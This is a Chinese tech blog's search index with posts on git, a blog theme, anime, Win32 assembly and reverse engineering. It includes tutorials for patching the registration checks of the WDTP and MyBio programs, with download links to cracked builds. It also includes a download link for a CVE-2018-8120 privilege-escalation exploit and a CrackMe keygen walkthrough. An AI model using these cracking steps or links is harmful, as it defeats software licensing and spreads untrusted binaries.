class="string">'git'</span>].items():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'push'</span>, k, <span class="string">'master:%s'</span> % v[<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span>:</span><br><span class="line">            print(<span class="string">'Usage:\n\t%s [commit_message]'</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Tools</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>纸小墨ink简洁主题story爱上你的故事</title>
    <url>/2018/08/22/ink-theme-story.html</url>
    <content><![CDATA[<h2 id="主题介绍"><a href="#主题介绍" class="headerlink" title="主题介绍"></a>主题介绍</h2><p>为纸小墨写的一款主题,该主题移植自<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a><br><!--和[Artifact.](https://artifact.me/)--></p>
<p>github地址：<a href="https://github.com/akkuman/ink-theme-story" target="_blank" rel="noopener">ink-theme-story</a></p>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><a href="https://ink-theme-story.pancakeapps.com" target="_blank" rel="noopener">ink-theme-story</a></p>
<a id="more"></a>
<h3 id="主题的一些食用说明"><a href="#主题的一些食用说明" class="headerlink" title="主题的一些食用说明"></a>主题的一些食用说明</h3><h4 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h4><p>标题旁边有一个 · 字符，点击后便可显示菜单。<strong>1</strong>,<strong>2</strong>,<strong>3</strong> 分别代表 <strong>独立页面菜单</strong>、<strong>导航树</strong>(仅在文章界面有用)以及<strong>搜索框</strong>。</p>
<h3 id="一些功能"><a href="#一些功能" class="headerlink" title="一些功能"></a>一些功能</h3><ul>
<li>评论点击加载, 可以应对一些墙导致无法加载的场景</li>
<li>图片懒加载</li>
<li>评论系统支持来必力, Disqus, Gitment, 默认为Disqus</li>
<li>…</li>
</ul>
<h2 id="主题截图"><a href="#主题截图" class="headerlink" title="主题截图"></a>主题截图</h2><p><img src="https://i.loli.net/2018/08/20/5b7a62b4ce584.png" alt="Screenshot_20180820_143859.png"></p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h3><p>进入到纸小墨程序的目录下, 也就是ink主程序的目录, 然后进入该目录下的blog目录</p>
<p>然后执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akkuman/ink-theme-story.git</span><br></pre></td></tr></table></figure></p>
<p>或者下载git压缩包后解压到blog文件夹</p>
<p>现在你可以看到blog目录下的ink-theme-story目录</p>
<p>然后修改站点配置文件<code>blog/config.yml</code></p>
<p>站点配置文件一般如下: </p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">site:</span></span><br><span class="line"><span class="attr">    title:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">    subtitle:</span> <span class="string">"Akkuman的技术博客"</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">    theme:</span> <span class="string">ink-theme-story</span></span><br><span class="line"><span class="attr">    lang:</span> <span class="string">zh</span></span><br><span class="line"><span class="attr">    url:</span> <span class="string">"ink-theme-story.pancakeapps.com"</span></span><br><span class="line"><span class="attr">    comment:</span> <span class="string">Akkuman</span></span><br><span class="line"><span class="attr">    logo:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line">    <span class="comment"># link: "&#123;category&#125;/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line"><span class="attr">    link:</span> <span class="string">"&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line">    <span class="comment"># root: "/blog"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">authors:</span></span><br><span class="line"><span class="attr">    me:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">        intro:</span> <span class="string">"编程小白|技术菜鸟"</span></span><br><span class="line"><span class="attr">        avatar:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span></span><br><span class="line">    <span class="comment"># output: "public"</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="comment"># Copied files to public folder when build</span></span><br><span class="line"><span class="attr">    copy:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"source/images"</span></span><br><span class="line">    <span class="comment"># Excuted command when use 'ink publish'</span></span><br><span class="line"><span class="attr">    publish:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        git add . -A</span></span><br><span class="line"><span class="string">        git commit -m "update"</span></span><br><span class="line"><span class="string">        git push origin</span></span><br></pre></td></tr></table></figure>
<p>我们需要<strong>修改</strong>的地方有:<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">title</span>   <span class="comment">#title字段是截图中的左上角Akkuman字段, 比如我设置为Akkuman那么就是和我截图中一样</span></span><br><span class="line"><span class="string">subtitle</span>    <span class="comment">#网站子标题, 在标签页和归档能看到</span></span><br><span class="line"><span class="attr">limit:</span> <span class="number">8</span>    <span class="comment">#每页可显示的文章数目, 为了美观建议设置为8</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">ink-theme-story</span>    <span class="comment">#网站主题目录, 设置为该主题ink-theme-story</span></span><br></pre></td></tr></table></figure></p>
<p>其他地方根据自己需求更改, 纸小墨说明文档见<a href="http://www.chole.io/blog/ink-blog-tool.html" target="_blank" rel="noopener">简洁的静态博客构建工具 —— 纸小墨（InkPaper）</a></p>
<h3 id="关于页面"><a href="#关于页面" class="headerlink" title="关于页面"></a>关于页面</h3><p>在纸小墨中,每篇文章是有作者的,我现在按上面我给出的例子配置为例进行说明</p>
<p>纸小墨中每一篇文章的头配置大致如下: </p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">"简洁的静态博客构建工具 —— 纸小墨（InkPaper）"</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2015</span><span class="bullet">-03</span><span class="bullet">-01</span> <span class="number">18</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">update:</span> <span class="number">2016</span><span class="bullet">-07</span><span class="bullet">-11</span> <span class="number">17</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">me</span></span><br><span class="line"><span class="attr">cover:</span> <span class="string">"-/images/example.png"</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">设计</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">写作</span></span><br><span class="line"><span class="attr">preview:</span> <span class="string">纸小墨（InkPaper）是一个GO语言编写的开源静态博客构建工具，可以快速搭建博客网站。它无依赖跨平台，配置简单构建快速，注重简洁易用与更优雅的排版。</span></span><br></pre></td></tr></table></figure>
<p>其中的<code>preview</code>是文章预览，也可在正文中使用<code>&lt;!--more--&gt;</code>分割, 是一个可选字段,我们不必管</p>
<p>对我们有影响的字段配置除了基础的<code>title</code>等等之外, 需要关注一下<code>author</code>这个字段</p>
<p>纸小墨每一篇文章的作者的关于页面是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">about.&#123;&#123;.Author.Id&#125;&#125;.html</span><br></pre></td></tr></table></figure>
<p>比如我上面的站点配置文件中<code>authors</code>有一个值是<code>me</code>, 那么这个作者的关于页面就是<code>about.me.html</code>, 也就是我们需要建立一个page, 纸小墨主程序打包中有一个文件<code>about.me.md</code>, 可以参见这个文件的格式, 我在这里给出来: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于作者&quot;</span><br><span class="line">author: me</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 纸小墨</span><br><span class="line"></span><br><span class="line">构建只为纯粹书写的博客。</span><br><span class="line"></span><br><span class="line">[http://www.chole.io/](http://www.chole.io/)</span><br></pre></td></tr></table></figure>
<p>那么这个文件生成后就会在站点根目录下生成<code>about.me.html</code>文件.</p>
<p><strong>重点来了</strong></p>
<p>上面我说的关于页面是单个作者的关于页面, 在这个主题中, 我有定义一个站点的关于页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;.Site.Root&#125;&#125;/about.html"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;i18n "about"&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们只需要按照上面<code>about.me.md</code>的格式新建一个<code>about.md</code>即可, 我在这里给出一个<code>about.md</code>例子: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于本站&quot;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">我是一个站点关于页面例子</span><br></pre></td></tr></table></figure>
<p><code>author</code>字段可省略,看自己的喜好</p>
<h3 id="评论系统切换"><a href="#评论系统切换" class="headerlink" title="评论系统切换"></a>评论系统切换</h3><p>本主题的评论采用点击再动态加载的方式, 所以不用担心因为Disqus被墙的原因导致页面打不开, 只有当你点击<code>show comments</code>时才会开始加载评论</p>
<p>本主题的评论系统支持来必力, Disqus, Gitment</p>
<h4 id="来必力Livere"><a href="#来必力Livere" class="headerlink" title="来必力Livere"></a>来必力Livere</h4><p>切换为来必力的话只需要修改站点配置文件<code>blog/config.yml</code>, 把<code>comment</code>字段的值修改成来必力的<code>data-uid</code>(<em>可在来必力后台代码管理中看到</em>), 然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把来必力评论的注释去掉, 然后把Disqus评论加上注释即可</p>
<h4 id="Gitment"><a href="#Gitment" class="headerlink" title="Gitment"></a>Gitment</h4><p>切换为Gitment的话同上修改, <code>comment</code>字段的格式为</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">comment:</span> <span class="string">"owner:repo:client_id:client_secret"</span></span><br></pre></td></tr></table></figure>
<p>其中各个的属性为</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">owner</span>           <span class="comment">#你的 GitHub ID</span></span><br><span class="line"><span class="string">repo</span>            <span class="comment">#存储评论的 repo</span></span><br><span class="line"><span class="string">client_id</span>       <span class="comment">#你的 client ID</span></span><br><span class="line"><span class="string">client_secret</span>   <span class="comment">#你的 client secret</span></span><br></pre></td></tr></table></figure>
<p>然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把Gitment评论的注释去掉, 然后把Disqus评论加上注释即可</p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>特别感谢<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a>提供了这么简洁大方的主题</p>
]]></content>
      <categories>
        <category>theme</category>
      </categories>
      <tags>
        <tag>theme</tag>
      </tags>
  </entry>
  <entry>
    <title>git忽略对已入库文件的修改</title>
    <url>/2018/08/22/git-update-index.html</url>
    <content><![CDATA[<p>项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。</p>
<a id="more"></a>
<ul>
<li><p>告诉git<strong>忽略</strong>对已经纳入版本管理的文件 <code>.classpath</code> 的修改，git 会一直忽略此文件直到重新告诉 git 可以再次跟踪此文件 <code>$ git update-index --assume-unchanged .classpath</code></p>
</li>
<li><p>告诉 git <strong>恢复跟踪</strong> <code>$ git update-index --assume-unchanged .classpath</code></p>
</li>
<li><p><strong>查看</strong>当前被忽略的、已经纳入版本库管理的文件：<code>$ git ls-files -v | grep -e &quot;^[hsmrck]&quot;</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-8120 Windows权限提升</title>
    <url>/2018/05/18/CVE-2018-8120.html</url>
    <content><![CDATA[<p>来源 : <a href="https://github.com/bigric3/cve-2018-8120" target="_blank" rel="noopener">bigric3/cve-2018-8120</a></p>
<p>Detail : <a href="http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html" target="_blank" rel="noopener">cve-2018-8120-analysis-and-exploit</a></p>
<a id="more"></a>
<h2 id="演示图"><a href="#演示图" class="headerlink" title="演示图"></a>演示图</h2><p><img src="https://github.com/bigric3/cve-2018-8120/raw/master/exploit.gif" alt="exploit.gif"></p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/akkuman/cve-2018-8120/releases" target="_blank" rel="noopener">CVE-2018-8120.zip</a></p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>补番完了 来自深渊</title>
    <url>/2018/04/27/made-in-abyss.html</url>
    <content><![CDATA[<p>这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。</p>
<a id="more"></a>
<p>莉可的身世原来只是一个可以动的尸体，原来除咒之笼并不能抵抗深渊的诅咒。</p>
<p>其实可以细想，莉可在上升的过程中不断承受诅咒一次次的死亡。</p>
<p>在见到不动卿奥森的时候，奥森告诉了莉可这个残酷的事实，而却没有过多的对莉可心理进行描述，全是描写的奥森和累格，还真是无情呢。</p>
<p>我挺喜欢奥森这个人的，孤傲或者说傲娇。 </p>
<p>在巨人之杯，剧情画风急转而下，莉可的濒死是如此真实。</p>
<p>都说娜娜琪是老婆，其实我觉得娜娜琪这个人物挺可悲的，不是因为他的经历，当然他的经历是一部分，我觉得我觉得他可悲更多是他从来没有为过自己做过什么事情，一直活在期待之中。</p>
<p>另外，我想说一下，娜娜琪不是男孩子吗，为什么是老婆。</p>
<p>下一季应该会碰到黎明卿了，感觉他这个人挺黑暗的，不知道具体怎样。</p>
<p><img src="https://i.loli.net/2018/04/27/5ae3271829c4f.png" alt="860634.png"></p>
<p><img src="https://i.loli.net/2018/04/27/5ae32734151eb.png" alt="880846.png"></p>
]]></content>
      <categories>
        <category>anime</category>
      </categories>
      <tags>
        <tag>life</tag>
        <tag>anime</tag>
      </tags>
  </entry>
  <entry>
    <title>160CrackMe第十九Brad Soblesky.2</title>
    <url>/2018/03/02/160CrackMe-019.html</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyrcq7eydj207004jgli.jpg" alt=""><br><a id="more"></a></p>
<p>查壳无壳，vc写的。  </p>
<p>我们输入假码后，然后点击，弹出错误框，直接打开od，对<code>MessageBoxA</code>下断点也行，寻找字符串也行。</p>
<p>一般的错误提示部分代码类似于这样。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call xxx</span><br><span class="line">test xxx,xxx</span><br><span class="line">je xxxerror</span><br><span class="line">...</span><br><span class="line">jmp xxx</span><br><span class="line">push xxx ;xxxerror</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">call error</span><br></pre></td></tr></table></figure></p>
<p>只需要往上找到关键跳直接nop就行。不过我们需要跟踪一下算法。</p>
<p>我们找到关键跳的<code>call</code>上方下断，可以看到他把一个东西压栈了，可以猜想是真码。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyroy9x6yj20zm0g1ae2.jpg" alt=""></p>
<p>然后我们测试一下111111和1643803416，提示正确，那我们找到这段的段首下断，然后f9运行程序重新输入假码点击Check。重点观察1643803416的出现地。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyrt7stnaj20wx0ecdj6.jpg" alt=""></p>
<p>我们可以看到在关键<code>call</code>的前方不远处就有出现，那么这个<code>add</code>前方的<code>call</code>是加密算法<code>call</code>吗？</p>
<p>显然不是的，我们可以看到这个<code>CString::Format</code>明显是对一个东西进行字符串格式化，格式是<code>%lu</code>(无符号长整数)，另外我们可以在它上面Enter跟一跟，可以发现直接从程序领空跳到系统领空了。所以我们可以猜测前面肯定是1643803416的一个什么数学形式然后用<code>%lu</code>格式化输出，我们可以推测是16进制，然后我们再重新来注意一下前面。</p>
<p>我们发现了1643803416的十六进制，在上方有个循环。其实之前在f8下来的时候，那个循环我们就可以推测是算法，现在经过分析可以更加肯定了。<code>mov eax,[local.4]</code>这个是这个循环最终跳出来的地方，那么<code>local.4</code>那里就是我们所需要找的东西。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foys1xvfuoj20rb0bwgnu.jpg" alt=""></p>
<p>在我们之前的两边跟中，我们可以测试发现<code>local.7</code>是你输入的Name的长度，<code>local.5</code>是我们输入的名字。</p>
<p>我们把上面的循环好好跟一遍。下面直接看我注释理解吧。对了，我们跟踪过程中也可以发现Name长度不能小于5，就在这个循环上方有个简单的判断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004015BE  |&gt; \C745 E0 00000&gt;mov [local.8],0x0</span><br><span class="line">004015C5  |.  EB 09         jmp short Brad_Sob.004015D0</span><br><span class="line">004015C7  |&gt;  8B55 E0       /mov edx,[local.8]</span><br><span class="line">004015CA  |.  83C2 01       |add edx,0x1</span><br><span class="line">004015CD  |.  8955 E0       |mov [local.8],edx                       ;  local8第一次进入循环为0，后续循环每次+1</span><br><span class="line">004015D0  |&gt;  8B45 E0        mov eax,[local.8]</span><br><span class="line">004015D3  |.  3B45 E4       |cmp eax,[local.7]                       ;  local7 = len(name)</span><br><span class="line">004015D6  |.  7D 42         |jge short Brad_Sob.0040161A             ;  当local8&gt;=len(name)跳出循环</span><br><span class="line">004015D8  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015DB  |.  51            |push ecx</span><br><span class="line">004015DC  |.  8D4D EC       |lea ecx,[local.5]                       ;  local5=name</span><br><span class="line">004015DF  |.  E8 1C030000   |call Brad_Sob.00401900                  ;  取name[local8]的十六进制ascii放入al</span><br><span class="line">004015E4  |.  0FBED0        |movsx edx,al</span><br><span class="line">004015E7  |.  8B45 F0       |mov eax,[local.4]                       ;  local4初始值为0x81276345</span><br><span class="line">004015EA  |.  03C2          |add eax,edx</span><br><span class="line">004015EC  |.  8945 F0       |mov [local.4],eax                       ;  local4 += name[local8]的十六进制</span><br><span class="line">004015EF  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015F2  |.  C1E1 08       |shl ecx,0x8</span><br><span class="line">004015F5  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">004015F8  |.  33D1          |xor edx,ecx</span><br><span class="line">004015FA  |.  8955 F0       |mov [local.4],edx                       ;  local4 = (local8&lt;&lt;8)^local4</span><br><span class="line">004015FD  |.  8B45 E0       |mov eax,[local.8]</span><br><span class="line">00401600  |.  83C0 01       |add eax,0x1</span><br><span class="line">00401603  |.  8B4D E4       |mov ecx,[local.7]</span><br><span class="line">00401606  |.  0FAF4D E0     |imul ecx,[local.8]</span><br><span class="line">0040160A  |.  F7D1          |not ecx</span><br><span class="line">0040160C  |.  0FAFC1        |imul eax,ecx                            ;  eax = (~(len(name)*local8))*(local8+1)</span><br><span class="line">0040160F  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">00401612  |.  0FAFD0        |imul edx,eax</span><br><span class="line">00401615  |.  8955 F0       |mov [local.4],edx                       ;  local4 *= eax</span><br><span class="line">00401618  |.^ EB AD         \jmp short Brad_Sob.004015C7</span><br><span class="line">0040161A  |&gt;  8B45 F0       mov eax,[local.4]</span><br></pre></td></tr></table></figure>
<p>相信结合我的注释自己细看一遍应该不太费力。下面直接写注册算法。其实上面的基本上用伪代码都写的比较明白了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// name为输入的第一个值 </span></span><br><span class="line">	<span class="keyword">char</span>* name = <span class="string">"111111"</span>;</span><br><span class="line">	<span class="keyword">int</span> len_name = <span class="built_in">strlen</span>(name);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (len_name&lt;<span class="number">5</span>)</span><br><span class="line">		<span class="comment">// name小于5出现提示并退出 </span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"User Name must have at least 5 characters.\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">long</span> result = <span class="number">0x81276345</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len_name; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			result += name[i];</span><br><span class="line">			result ^= (i&lt;&lt;<span class="number">8</span>);</span><br><span class="line">			result *= ~(len_name*i)*(i+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"result: %lu\n"</span>,result);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CrackMe</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>MyBio小隐本记注册破解</title>
    <url>/2018/02/28/MyBio-Crack.html</url>
    <content><![CDATA[<p>既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio</p>
<a id="more"></a>
<p>和WDTP的原理是差不多的，先把软件界面换成e文，然后写了15个记录后提示注册，一样的路子，直接跳过注册窗口的弹出就好了</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fowhkbesvuj20b0088t8x.jpg" alt="注册窗口"></p>
<p>然后查壳一样是vs2015的无壳64位程序，直接附加到x64dbg，然后有了之前WDTP的经验，我们直接找弹出注册窗口的地方，查找字符串，然后搜索上图中<code>Serial-number:</code></p>
<p>一样的，找到了注册窗体生成的地方，在段首下个断，然后回溯一次，可以看到</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fowhspimgmj20q507vgmx.jpg" alt=""></p>
<p>直接把这个call上方的jle改成jmp即可爆破。</p>
<hr>
<p>软件下载地址：</p>
<p><a href="https://share.weiyun.com/f5a48a92d8f458277e937dadc730a5ad" target="_blank" rel="noopener">密码：0yb0cz</a></p>
<p>解压后注意校验</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大小: 4181504 字节</span><br><span class="line">文件版本: 2.1.1004</span><br><span class="line">修改时间: 2018年2月28日, 21:27:02</span><br><span class="line">MD5: EEA6B0BF010E45EA7EF340FFB543C316</span><br><span class="line">SHA1: BAA4BE7B3F2DE0F75996C0E9BE8DA0C177444CE8</span><br><span class="line">CRC32: 999277D5</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>WDTP注册破解</title>
    <url>/2018/02/26/WDTP-Crack.html</url>
    <content><![CDATA[<p>今天来讲讲WDTP这个软件的破解。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。<br><a id="more"></a></p>
<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>之前这个软件是开源的，后来作者把它闭源了，然后加上了注册机制，我今天测试了一下，在我写了十多篇文章之后我再添加就提示我需要注册。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2567e65j20b0088t8y.jpg" alt=""><br>查一下壳，没有壳，64位的<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou25yvsaxj20ei074q3n.jpg" alt=""><br>直接附加到x64dbg中，然后我们搜索一下字符串serial，可以找到错误提示的地方。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou27t4wefj213q0fetcj.jpg" alt=""><br>我们反汇编窗口中下个断，我们可以看到上方的ret，说明提示错误信息是跳转进来的，然后我们在段首下好断，重新注册可以找到调用这里的地方<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2buv9phj20fs06qaay.jpg" alt=""><br>我们跟过去<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2d3h9nvj20hc02zt8z.jpg" alt=""><br>可以看到错误提示的call，这个call上方有一个jmp可以跳过，说明在前方应该有一个跳转跳过了这个jmp，直接跳到了这个错误提示call。我们再往前看一点。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2fedcjfj20m50chgnw.jpg" alt=""><br>我们可以看到上面的je，je前面的call是一个对比的call，爆破的话，我们不管这个，直接把je给nop掉。<br>然后我们执行，发现还是点击新建就会弹出来注册框，功能无法使用。<br>我们继续在字符串中找，可以看到窗口上面的Purchase，Question等等字符，可以发现错误提示的上面一段就是这个注册窗口弹出的一段，我们依旧在这个段的段首下段，然后找到调用它（弹注册窗）的地方。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2xb5dm0j20ia03lgm3.jpg" alt=""><br>它是直接jmp下来的，我们可以看到上面有一个call之后跟着一个test然后一个jne，我们可以猜想是你新建文档的时候先比对一下你是否注册，然后根据结果跳转，我们直接把jne改成jmp试试，让它直接跳过弹注册窗口。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou33aziswj209q054q2u.jpg" alt=""><br>完美，现在新建没问题了。</p>
<h2 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h2><p>所以我们只需要把它的这个弹注册窗的地方直接jmp过就好，我们在我们修改的命令上面右键补丁<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou352soi2j20ed0dbt90.jpg" alt=""><br>然后点击修复文件即可导出成一个破解版的exe。</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载后注意校验信息<br>文件信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件版本: 1.1.1004</span><br><span class="line">修改时间: 2018年2月26日, 19:40:44</span><br><span class="line">MD5: 5B8DF3D4572842376EA850B8551DEEED</span><br><span class="line">SHA1: B282AC870E4159A2ACEA389015FE4F4409A0F887</span><br><span class="line">CRC32: F51675CE</span><br></pre></td></tr></table></figure></p>
<p><a href="https://share.weiyun.com/5f8f4a09b5fb84f23479479e661b0c69" target="_blank" rel="noopener">密码：h7b4ru</a></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32汇编学习(7)：鼠标输入消息</title>
    <url>/2018/02/09/Win32ASM7-Mouse-input-msg.html</url>
    <content><![CDATA[<p>这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>和处理键盘输入一样，WINDOWS将捕捉鼠标动作并把它们发送到相关窗口。这些活动包括左、右键按下、移动、双击、滚轮消息<code>WM_WHEEL</code>等。WINDOWS并不像处理键盘输入那样把所有的鼠标消息都导向有输入焦点的窗口，<strong>任何鼠标经过的窗口都将接收到鼠标消息，无论有否输入焦点</strong>。另外，窗口还会接收到鼠标在非客户区移动的消息（<code>WM_NCMOVE</code>），但大多数的情况下我们都会将其忽略掉。当鼠标在某窗口客户区移动时，该窗口将接收到<code>WM_MOUSEMOVE</code>消息。一个窗口若想处理<code>WM_LBUTTONDBCLK</code>或 <code>WM_RBUTTONDBCLK</code>，那么它的窗口类必须有<code>CS_DBLCLKS</code>风格，否则它就会接受到一堆的按键起落（<code>WM_XBUTTONDOWN</code>或<code>WM_XBUTTONUP</code>)的消息。 对于所有的消息，<strong>窗口过程函数传入的参数<code>lParam</code>包含了鼠标的位置，其中低位为x坐标，高位为y坐标</strong>，这些坐标值都是相对于窗口客户区的左上角的值，<code>wParam</code>中则包含了鼠标按钮的状态。 </p>
